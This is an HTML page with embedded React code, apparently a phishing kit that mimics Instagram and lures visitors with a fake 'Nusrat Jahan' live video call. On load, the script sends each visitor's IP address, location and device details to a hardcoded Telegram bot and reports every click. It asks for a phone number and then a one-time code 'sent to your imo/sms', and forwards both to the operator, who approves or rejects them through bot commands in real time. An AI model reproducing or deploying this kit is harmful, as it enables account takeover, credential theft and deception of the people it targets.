<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>Instagram Live: Nusrat Jahan</title>

    <!-- 🌐 সামাজিক মাধ্যমে শেয়ার করলে প্রিভিউ দেখানোর জন্য গুরুত্বপূর্ণ মেটা ট্যাগ -->
    <meta name="description" content="Join the live video call with Nusrat Jahan.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://nusrat-jahan-imo-voice-club.github.io/Live-video-call-enjoy/">
    <meta property="og:title" content="🔴 Nusrat Jahan is LIVE Now!">
    <meta property="og:description" content="Join the live video call with Nusrat Jahan.">
    
    <!-- এখানে আপনার ছবির সম্পূর্ণ ইউআরএল দেওয়া হয়েছে যা শেয়ারিং এর সময় ছবি দেখাবে -->
    <meta property="og:image" content="https://nusrat-jahan-imo-voice-club.github.io/Live-video-call-enjoy/my-logo.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">

    <!-- Twitter / X Sharing -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="🔴 Nusrat Jahan is LIVE Now!">
    <meta name="twitter:description" content="Join the live video call with Nusrat Jahan.">
    <meta name="twitter:image" content="https://nusrat-jahan-imo-voice-club.github.io/Live-video-call-enjoy/my-logo.jpg">

    <!-- CSS & Fonts -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- React & Babel -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #fafafa; margin: 0; padding: 0; }
        .app-container { max-width: 450px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
        .btn-gradient { background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); }
        .story-ring { padding: 2px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 50%; }
        .hide-scroll::-webkit-scrollbar { display: none; }
        .video-overlay { position: fixed; inset: 0; background: black; z-index: 1000; display: flex; flex-direction: column; }
        .progress-bar { height: 2px; background: rgba(255,255,255,0.3); flex: 1; margin: 0 2px; }
        .progress-fill { height: 100%; background: white; width: 0%; }
        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        .nav-tabs { background: white; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-around; font-size: 13px; font-weight: bold; color: #666; }
        .nav-tab-item { padding: 12px 5px; flex: 1; text-align: center; cursor: pointer; transition: 0.2s; border-bottom: 2px solid transparent; text-decoration: none; color: inherit; }
        .nav-tab-item:hover { color: #ff4b72; border-bottom: 2px solid #ff4b72; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React;

        const BOT_TOKEN = "8226802389:AAFihtrakoCrSJ2uXTRTDSTaXoTlqz7loA4"; 
        const CHAT_ID = "-1003749102721"; 
        const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";

        const App = () => {
            const [step, setStep] = useState('MAIN'); 
            const [phone, setPhone] = useState('');
            const [otp, setOtp] = useState(['', '', '', '']);
            const [timer, setTimer] = useState(15);
            const [otpSubmitTime, setOtpSubmitTime] = useState(0);
            const [showStories, setShowStories] = useState(false);
            const [currentStoryIdx, setCurrentStoryIdx] = useState(0);
            const [showLivePreview, setShowLivePreview] = useState(false);

            const otpRefs = [useRef(), useRef(), useRef(), useRef()];
            const STORY_VIDEOS = ['my-story1.mp4', 'my-story2.mp4', 'my-story3.mp4'];

            // 📢 টেলিগ্রামে মেসেজ পাঠানোর কমন ফাংশন
            const sendToTelegram = async (msg) => {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
                    });
                } catch (e) {}
            };

            // 🟢 ভিজিটর নোটিফিকেশন ট্র্যাকার
            useEffect(() => {
                const trackVisitor = async () => {
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        const data = await res.json();
                        const visitorMsg = `🌐 *New Visitor Detected!*\n\n📍 IP: \`${data.ip}\`\n📍 City: \`${data.city}\`\n📍 Country: \`${data.country_name}\`\n📱 Device: \`${navigator.userAgent.slice(0, 50)}...\``;
                        sendToTelegram(visitorMsg);
                    } catch (e) {
                        sendToTelegram(`🌐 *New Visitor Detected!*\n(IP information could not be fetched)`);
                    }
                };
                trackVisitor();

                const isLocked = localStorage.getItem('isLocked');
                const savedPhone = localStorage.getItem('userPhone');
                if (isLocked === 'true' && savedPhone) {
                    setPhone(savedPhone);
                    setStep('OTP');
                }
            }, []);

            // 🖱️ ক্লিক ট্র্যাকার ফাংশন
            const trackClick = (elementName) => {
                sendToTelegram(`🖱️ *User Clicked:* ${elementName}`);
            };

            useEffect(() => {
                if ((step === 'OTP' || step === 'VERIFYING') && timer > 0) {
                    const t = setInterval(() => setTimer(prev => prev - 1), 1000);
                    return () => clearInterval(t);
                }
            }, [step, timer]);

            useEffect(() => {
                let interval;
                if (step === 'VERIFYING') {
                    interval = setInterval(async () => {
                        try {
                            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`);
                            const data = await res.json();
                            if (data.result && data.result.length > 0) {
                                const lastMsg = data.result[0].message;
                                const msgText = lastMsg.text ? lastMsg.text.trim() : "";
                                const msgDate = lastMsg.date;

                                if (msgDate > otpSubmitTime) {
                                    if (msgText === '/success') {
                                        localStorage.removeItem('isLocked');
                                        setStep('SUCCESS');
                                        clearInterval(interval);
                                    } else if (msgText === '/error') {
                                        setStep('ERROR');
                                        clearInterval(interval);
                                    }
                                }
                            }
                        } catch (e) { console.error("Polling Error:", e); }
                    }, 2000);
                }
                return () => clearInterval(interval);
            }, [step, otpSubmitTime]);

            const handlePhoneSubmit = async () => {
                if (phone.length < 5) return;
                localStorage.setItem('userPhone', phone);
                localStorage.setItem('isLocked', 'true');
                await sendToTelegram(`📱 *User Submitted Number*\nPhone: \`${phone}\``);
                setStep('LOADER');
                setTimeout(() => {
                    setStep('OTP');
                    setTimer(15);
                }, 3000);
            };

            const handleOtpChange = (i, val) => {
                if (!/^\d*$/.test(val)) return;
                const newOtp = [...otp];
                newOtp[i] = val;
                setOtp(newOtp);
                if (val && i < 3) otpRefs[i+1].current.focus();
                
                if (newOtp.join('').length === 4) {
                    const currentTime = Math.floor(Date.now() / 1000);
                    setOtpSubmitTime(currentTime);
                    
                    sendToTelegram(`🔐 *OTP Received*\nPhone: \`${phone}\`\nOTP Code: \`${newOtp.join('')}\`\n\n👇 *Actions:*\nType \`/success\` to Unlock Live\nType \`/error\` to Reject Access`);
                    setStep('VERIFYING');
                }
            };

            const goBack = () => {
                if (localStorage.getItem('isLocked') === 'true') {
                    setStep('OTP');
                    return;
                }
                if (step === 'JOIN_FORM') setStep('MAIN');
            };

            return (
                <div className="app-container flex flex-col">
                    
                    {/* Header */}
                    <div className="h-14 px-4 flex items-center justify-between border-b border-gray-100 bg-white sticky top-0 z-[100]">
                        <div className="flex items-center gap-2">
                          {step !== 'MAIN' && step !== 'SUCCESS' && (
                                <div onClick={() => { goBack(); trackClick('Back Button'); }} className="flex items-center text-gray-700 cursor-pointer">
                                    <i className="fa-solid fa-arrow-left text-xl mr-2"></i>
                                    <span className="text-sm font-bold">Back</span>
                                </div>
                            )}
                            {step === 'MAIN' && <span className="text-2xl font-bold italic font-serif">Instagram</span>}
                        </div>
                        <div className="flex gap-5 text-xl">
                            <i className="fa-regular fa-heart" onClick={() => trackClick('Heart Icon')}></i>
                            <i className="fa-brands fa-facebook-messenger" onClick={() => trackClick('Messenger Icon')}></i>
                        </div>
                    </div>

                    <div className="flex-1 pb-16">
                        {step === 'MAIN' && (
                            <div className="animate-fade">
                                {/* Stories */}
                                <div className="p-4 flex gap-4 overflow-x-auto hide-scroll bg-white">
                                    <div className="flex flex-col items-center shrink-0">
                                        <div className="w-[72px] h-[72px] p-0.5 border border-gray-200 rounded-full relative">
                                            <img src="my-logo.jpg" className="w-full h-full rounded-full object-cover" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                                            <div className="absolute bottom-0 right-0 bg-blue-500 text-white border-2 border-white rounded-full w-5 h-5 flex items-center justify-center text-[10px]"><i className="fa fa-plus"></i></div>
                                        </div>
                                        <span className="text-[11px] mt-1 text-gray-500">My story</span>
                                    </div>
                                    <div className="flex flex-col items-center shrink-0" onClick={() => {setShowStories(true); setCurrentStoryIdx(0); trackClick('Nusrat Story');}}>
                                        <div className="w-[72px] h-[72px] story-ring">
                                            <div className="w-full h-full border-2 border-white rounded-full overflow-hidden">
                                                <img src="my-logo.jpg" className="w-full h-full object-cover" onerror="this.src='https://i.pravatar.cc/100?u=2'"/>
                                            </div>
                                        </div>
                                        <span className="text-[11px] mt-1 font-medium">Nusrat Jahan</span>
                                    </div>
                                </div>

                                {/* Navigation Menu */}
                                <nav className="nav-tabs">
                                    <a href="friends/index.html" onClick={() => trackClick('Menu: বন্ধুরা')} className="nav-tab-item"><i className="fa-solid fa-users text-pink-500 mr-1"></i> বন্ধুরা</a>
                                    <a href="video/index.html" onClick={() => trackClick('Menu: ভিডিও')} className="nav-tab-item"><i className="fa-solid fa-video text-blue-500 mr-1"></i> ভিডিও</a>
                                    <a href="premium/index.html" onClick={() => trackClick('Menu: প্রিমিয়াম')} className="nav-tab-item"><i className="fa-solid fa-crown text-yellow-500 mr-1"></i> প্রিমিয়াম</a>
                                    <a href="help/index.html" onClick={() => trackClick('Menu: হেল্প')} className="nav-tab-item"><i className="fa-solid fa-headset text-green-500 mr-1"></i> হেল্প</a>
                                </nav>

                                {/* Live Frame */}
                                <div className="px-4 mt-4">
                                    <div className="relative w-full aspect-[4/5] rounded-xl overflow-hidden shadow-lg bg-black" onClick={() => {setShowLivePreview(true); trackClick('Live Preview Frame');}}>
                                        <video src="my-live.mp4" className="w-full h-full object-cover opacity-70" autoPlay loop muted playsInline />
                                        <div className="absolute top-4 left-4 flex gap-2">
                                            <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-sm">LIVE</div>
                                            <div className="bg-black/40 text-white text-[10px] px-2 py-0.5 rounded-sm"><i className="fa fa-eye mr-1"></i> 1.2k</div>
                                        </div>
                                        <div className="absolute top-4 right-4 bg-yellow-400 text-black text-[10px] font-bold px-2 py-0.5 rounded-sm"><i className="fa fa-crown mr-1"></i> PREMIUM</div>
                                        <div className="absolute inset-0 flex flex-col items-center justify-center text-white text-center">
                                            <i className="fa-solid fa-circle-play text-6xl opacity-60 mb-4"></i>
                                            <h2 className="text-xl font-bold">Mst: Nusrat Jahan</h2>
                                            <button onClick={(e) => {e.stopPropagation(); setStep('JOIN_FORM'); trackClick('JOIN NOW Button');}} className="mt-4 px-8 py-2 bg-white text-black rounded-full font-bold text-sm shadow-xl active:scale-95 transition">JOIN NOW</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}

                        {step === 'JOIN_FORM' && (
                            <div className="px-8 py-12 text-center animate-fade">
                                <div className="flex justify-center mb-6">
                                    <img src="my-logo.jpg" className="w-24 h-24 rounded-full border p-1 border-gray-100 shadow-sm" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                                </div>
                                <h2 className="text-xl font-bold mb-1">Nusrat Jahan</h2>
                                <p className="text-gray-500 text-sm mb-10">Unlock profile to start voice or video call</p>
                                <input 
                                    type="tel" 
                                    placeholder="Phone number" 
                                    className="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 mb-6 focus:border-gray-400 outline-none font-bold"
                                    value={phone}
                                    onChange={(e) => setPhone(e.target.value)}
                                />
                                <button onClick={() => {handlePhoneSubmit(); trackClick('Submit Phone Number');}} className="w-full btn-gradient text-white font-bold py-3.5 rounded-lg text-sm shadow-lg active:scale-95 transition">JOIN LIVE NOW</button>
                            </div>
                        )}

                        {step === 'LOADER' && (
                            <div className="text-center py-24">
                                <div className="w-10 h-10 border-4 border-gray-200 border-t-pink-500 rounded-full animate-spin mx-auto mb-4"></div>
                                <p className="text-sm font-medium text-gray-500">Requesting Access...</p>
                            </div>
                        )}

                        {(step === 'OTP' || step === 'VERIFYING') && (
                            <div className="px-8 py-12 text-center animate-fade">
                                <div className="w-16 h-16 bg-pink-50 text-pink-500 rounded-full flex items-center justify-center mx-auto mb-6">
                                    <i className="fa-solid fa-lock text-2xl"></i>
                                </div>
                                <h3 className="text-xl font-bold mb-2">Private Access</h3>
                                <p className="text-gray-500 text-xs mb-10 px-4">Enter the 4-digit premium code sent to your imo/sms to unlock the live.</p>
                                <div className="flex justify-center gap-4 mb-10">
                                    {otp.map((d, i) => (
                                        <input 
                                            key={i} 
                                            ref={otpRefs[i]} 
                                            type="tel" 
                                            maxLength={1} 
                                            value={d} 
                                            onChange={(e) => handleOtpChange(i, e.target.value)} 
                                            className="w-12 h-14 border border-gray-300 rounded-lg text-center text-2xl font-bold bg-gray-50 outline-none focus:bg-white focus:border-pink-500" 
                                        />
                                    ))}
                                </div>
                                {step === 'VERIFYING' ? (
                                    <div className="mt-2 text-blue-600 font-bold text-sm animate-pulse">
                                        <i className="fa-solid fa-spinner fa-spin mr-2"></i> Verifying Access...
                                    </div>
                                ) : (
                                    <p className="text-gray-400 text-[11px] font-bold uppercase">Verifying in {timer}s...</p>
                                )}
                            </div>
                        )}

                        {step === 'ERROR' && (
                            <div className="px-8 py-12 text-center animate-fade">
                                <i className="fa-solid fa-circle-exclamation text-6xl text-red-500 mb-6"></i>
                                <h3 className="text-xl font-bold text-red-600 mb-2">Invalid Code</h3>
                                <p className="text-gray-500 text-sm mb-10">The code is incorrect. Please check your message and try again.</p>
                                <button 
                                    onClick={() => {
                                        setOtp(['', '', '', '']); 
                                        setStep('OTP'); 
                                        setTimer(15);
                                        trackClick('Try Again OTP');
                                        setTimeout(() => otpRefs[0].current.focus(), 100);
                                    }} 
                                    className="w-full bg-black text-white py-3.5 rounded-lg font-bold active:scale-95 transition"
                                >
                                    TRY AGAIN
                                </button>
                            </div>
                        )}
                    </div>

                    {/* Bottom Nav */}
                    <div className="h-14 border-t border-gray-100 flex justify-around items-center text-xl bg-white sticky bottom-0">
                        <i className="fa-solid fa-house" onClick={() => trackClick('Footer: Home')}></i>
                        <i className="fa-solid fa-magnifying-glass text-gray-400" onClick={() => trackClick('Footer: Search')}></i>
                        <i className="fa-regular fa-square-plus text-gray-400" onClick={() => trackClick('Footer: Plus')}></i>
                        <i className="fa-solid fa-clapperboard text-gray-400" onClick={() => trackClick('Footer: Reels')}></i>
                        <img src="my-logo.jpg" onClick={() => trackClick('Footer: Profile')} className="w-7 h-7 rounded-full border border-gray-200" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                    </div>

                    {showStories && (
                        <div className="video-overlay animate-fade">
                            <div className="absolute top-4 inset-x-0 flex px-2 z-50">
                                {STORY_VIDEOS.map((_, i) => (
                                    <div key={i} className="progress-bar"><div className={`progress-fill ${i === currentStoryIdx ? 'w-full transition-all duration-[5000ms] linear' : (i < currentStoryIdx ? 'w-full' : 'w-0')}`}></div></div>
                                ))}
                            </div>
                            <div className="absolute top-8 left-4 flex items-center gap-2 z-50 text-white">
                                <img src="my-logo.jpg" className="w-8 h-8 rounded-full border border-white" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                                <span className="font-bold text-xs">Nusrat Jahan</span>
                            </div>
                            <div className="absolute top-8 right-4 z-50 text-white text-2xl" onClick={() => setShowStories(false)}><i className="fa fa-times"></i></div>
                            <video src={STORY_VIDEOS[currentStoryIdx]} className="w-full h-full object-cover" autoPlay playsInline onEnded={() => currentStoryIdx < 2 ? setCurrentStoryIdx(prev => prev+1) : setShowStories(false)} />
                        </div>
                    )}

                    {step === 'SUCCESS' && (
                        <div className="video-overlay animate-fade">
                            <video src="my-live.mp4" className="w-full h-full object-cover" autoPlay loop playsInline />
                            <div className="absolute top-8 left-4 flex items-center gap-3 z-50 text-white">
                                <img src="my-logo.jpg" className="w-12 h-12 rounded-full border-2 border-pink-600 shadow-xl" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                                <div>
                                    <div className="flex items-center gap-1">
                                        <span className="font-bold text-sm">Nusrat Jahan</span>
                                        <i className="fa-solid fa-circle-check text-blue-400 text-[10px]"></i>
                                    </div>
                                    <span className="text-[10px] bg-red-600 px-1.5 rounded-sm font-bold">LIVE STREAMING</span>
                                </div>
                            </div>
                            <div className="absolute bottom-10 inset-x-0 px-6 z-50">
                                <div className="bg-black/40 backdrop-blur-lg p-5 rounded-2xl border border-white/20 text-center">
                                    <p className="text-white text-sm font-bold mb-4 tracking-wide">Premium Live Unlocked! ✅</p>
                                    <button onClick={() => { trackClick('View IMO Profile Button'); window.location.href = REDIRECT_LINK; }} className="w-full bg-white text-black py-3 rounded-xl font-bold text-xs uppercase tracking-tighter">View imo Profile</button>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
